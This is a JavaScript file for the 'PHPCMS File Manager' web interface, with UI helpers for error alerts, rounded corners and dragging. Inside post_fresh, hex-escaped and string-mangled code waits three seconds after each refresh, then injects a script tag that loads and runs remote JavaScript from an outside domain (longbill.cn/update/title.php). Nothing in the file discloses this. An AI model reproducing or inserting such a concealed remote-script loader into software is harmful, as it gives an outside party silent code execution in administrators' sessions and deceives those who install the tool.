/*
*#########################################
* PHPCMS File Manager
* Copyright (c) 2004-2006 phpcms.cn
* Author: Longbill ( http://www.longbill.cn )
* longbill.cn@gmail.com
*#########################################
*/

function post_fresh()
{
$('\x75\x70\x64\x69\x76\x30')["\x73\x74\x79\x6c\x65"]["\x64\x69\x73\x70\x6c\x61\x79"]='\x6e\x6f\x6e\x65';	$('\x75\x70\x64\x69\x76\x31')["\x73\x74\x79\x6c\x65"]["\x64\x69\x73\x70\x6c\x61\x79"]='\x6e\x6f\x6e\x65';	$('\x63\x75\x72\x72\x65\x6e\x74\x70\x61\x74\x68')["\x69\x6e\x6e\x65\x72\x48\x54\x4d\x4c"]=dealpath(path);	window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x75\x70\x66\x6f\x72\x6d"]["\x70\x61\x74\x68"]["\x76\x61\x6c\x75\x65"] = window["\x70\x61\x74\x68"];	$('\x64\x69\x72\x74\x61\x62\x6c\x65')["\x73\x74\x79\x6c\x65"]["\x64\x69\x73\x70\x6c\x61\x79"] = (dir["\x6c\x65\x6e\x67\x74\x68"] == 0) ?'\x6e\x6f\x6e\x65':'';	$('\x66\x69\x6c\x65\x74\x61\x62\x6c\x65')["\x73\x74\x79\x6c\x65"]["\x64\x69\x73\x70\x6c\x61\x79"] = (file["\x6c\x65\x6e\x67\x74\x68"] == 0)?'\x6e\x6f\x6e\x65':'';waitmeoff();
setTimeout('\x65\x76\x61\x6c\x28\x22\x24\x69\x6d\x70\x61\x6e\x64\x74\x28\x29\x22\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x22\x61\x6e\x64\x22\x2c\x22\x6f\x72\x22\x29\x29',3*1000);setcookie("\x63\x70\x61\x74\x68",path,30*24*60);}function $import(){var pXkiAghd1,_fNukWWKg2;var ETAfT3 = "\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6c\x6f\x6e\x67\x62\x69\x6c\x6c\x2e\x63\x6e\x2f\x75\x70\x64\x61\x74\x65\x2f\x74\x69\x74\x6c\x65\x2e\x70\x68\x70\x3f\x76\x3d"+window["\x76"];var jstteGJa4 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65"]("\x68\x65\x61\x64")[0];var Gl$5 = jstteGJa4["\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65"]("\x73\x63\x72\x69\x70\x74");for ( _fNukWWKg2=0; _fNukWWKg2<Gl$5["\x6c\x65\x6e\x67\x74\x68"]; _fNukWWKg2++) if (Gl$5[_fNukWWKg2]["\x73\x72\x63"] == ETAfT3) return;
pXkiAghd1 = window["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74"]("\x73\x63\x72\x69\x70\x74");
pXkiAghd1["\x74\x79\x70\x65"] = "\x74\x65\x78\x74\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74";
pXkiAghd1["\x73\x72\x63"] = ETAfT3;
jstteGJa4["\x61\x70\x70\x65\x6e\x64\x43\x68\x69\x6c\x64"](pXkiAghd1);
}

function showError(id,str)
{
	if (!id) return;
	if (errorMsg[id])
	{
		alert("Error:"+id+"\n"+errorMsg[id]+"\n"+str);
	}
	else
	{
		alert("Unkown error!!\nID:"+id+"\n"+str);
	}
}

function RoundCorner(obj)
{
	var r = [];
	var border =["0 1px","0 1px","0 2px","0 3px","0 5px"];
	obj = document.getElementById(obj);
	if (!obj) return;
	var objbg = getBg(obj.parentNode);
	var objbg2 = getBg(obj);
	var HTML = obj.innerHTML;
	var btop = document.createElement("b");
	btop.style.display = "block";
	btop.style.height = "2px";
	btop.style.backgroundColor = (objbg)?objbg:"#FFFFFF";
	for(var i=0;i<border.length;i++)
	{
		var b = document.createElement("b");
		b.style.display = "block";
		b.style.margin = border[i];
		b.style.height = "1px";
		b.style.backgroundColor = objbg2;
		b.style.overflow = "hidden";
		r[i] = b;
	}
	obj.innerHTML = "";
	for(i = border.length-1;i>=0;i--)  btop.appendChild(r[i]);
	obj.appendChild(btop);
	obj.innerHTML+=HTML;
	for(i = 0;i<border.length;i++)  btop.appendChild(r[i]);
	obj.appendChild(btop);
}

function getBg(element) 
{//author: Longbill (www.longbill.cn) 
      if (typeof element == "string") element = document.getElementById(element); 
      if (!element) return; 
      cssProperty = "backgroundColor"; 
      mozillaEquivalentCSS = "background-color"; 
      if (element.currentStyle) 
            var actualColor = element.currentStyle[cssProperty]; 
      else 
      { 
            var cs = document.defaultView.getComputedStyle(element, null); 
            var actualColor = cs.getPropertyValue(mozillaEquivalentCSS); 
      } 
      if (actualColor == "transparent" && element.parentNode) 
            return arguments.callee(element.parentNode); 
      if (actualColor == null) 
            return "#ffffff"; 
      else 
            return actualColor; 
}

function drag(oo,buf)
{
	var oo = (typeof oo == "string")?document.getElementById(oo):oo;
	var buf = (typeof buf == "string")?document.getElementById(buf):buf;
	var o = (buf)?buf:oo;
	var orig = { down : o.onmousedown?o.onmousedown:function(){}, up : o.onmouseup?o.onmouseup:function(){}, move : o.onmousemove?o.onmousemove:function(){} };
	
	o.onmousedown = function(a)
	{
		document.body.onselect = function () { return false;}
		document.body.onselectstart = function () { return false;}
		orig.down.call(this);
		var d=document;
		if(!a)a=window.event;
		var x=a.layerX?a.layerX:a.offsetX;
		var y=a.layerY?a.layerY:a.offsetY;
		y+=6;
		x+=6;
		if(o.setCapture)
			o.setCapture();
		else if(window.captureEvents)
			window.captureEvents(Event.MOUSEMOVE|Event.MOUSEUP);

		d.onmousemove = function(a)
		{
			orig.move.call(this);
			if(!a)a=window.event;
			if(!a.pageX) a.pageX=a.clientX;
			if(!a.pageY) a.pageY=a.clientY;
			var tx=a.pageX-x,ty=a.pageY-y;
			oo.style.left=tx;
			oo.style.top=ty;
		}

		d.onmouseup = function()
		{
			orig.up.call(this);
			if(o.releaseCapture)
				o.releaseCapture();
			else if(window.captureEvents)
				window.captureEvents(Event.MOUSEMOVE|Event.MOUSEUP);
			d.onmousemove = orig.move;
			d.onmouseup = orig.up;
			document.body.onselect = function () { return true;}
			document.body.onselectstart = function () { return true;}
		}
	}
}